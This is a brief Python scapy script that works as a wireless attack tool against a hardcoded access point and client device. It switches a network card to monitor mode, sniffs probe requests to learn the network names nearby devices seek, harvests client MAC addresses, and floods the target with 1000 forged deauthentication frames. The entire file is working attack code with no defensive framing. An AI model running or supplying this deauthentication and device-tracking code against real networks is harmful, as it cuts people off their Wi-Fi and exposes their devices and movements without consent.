import sys
import os
from scapy.all import *

interface= "wlx00c0ca84aba2"
ap_mac = "e0:22:04:2f:4d:0e"
device_mac = "60:be:b5:f0:23:b1"
probeReqs = []
macAddresses = []

def sniff_probe_requests(pkt):
	if pkt.haslayer(Dot11ProbeReq):
		netName = pkt.getlayer(Dot11ProbeReq).info
		if netName not in probeReqs:
			probeReqs.append(netName)
			print "[+] Detected new probe request: " + netName

def sniff_all_mac_addresses(pkt):
	if pkt.haslayer(Dot11):
		
		layer = pkt.getlayer(Dot11)
		if layer.addr2 and (layer.addr2 not in macAddresses) and layer.addr1 == ap_mac:
			macAddresses.append(layer.addr2)
			print "[+] Detected new mac address: " + layer.addr2

def get_probe_requests():
    print "getting probe requests.."
    sniff(iface=interface, prn=sniff_probe_requests)


def get_all_mac_addresses():
	print "getting all mac addresses on network.."
	sniff(iface=interface, prn=sniff_all_mac_addresses)

def deauth_device():
	print "deauthing.."
	pkt = RadioTap() / Dot11( addr1=ap_mac, addr2=device_mac, addr3=device_mac) / Dot11Deauth() 
	sendp(pkt, iface=interface, count=1000, inter=1)

def setup_nic():
	os.system("sudo ifconfig " + interface + " down")
	os.system("sudo iwconfig " + interface + " mode monitor")
	os.system("sudo ifconfig " + interface + " up")

if sys.argv[1] == '-d':
	deauth_device()
elif sys.argv[1] == '-g':
	get_all_mac_addresses()
elif sys.argv[1] == '-p':
	get_probe_requests()
elif sys.argv[1] == '-s':
	setup_nic()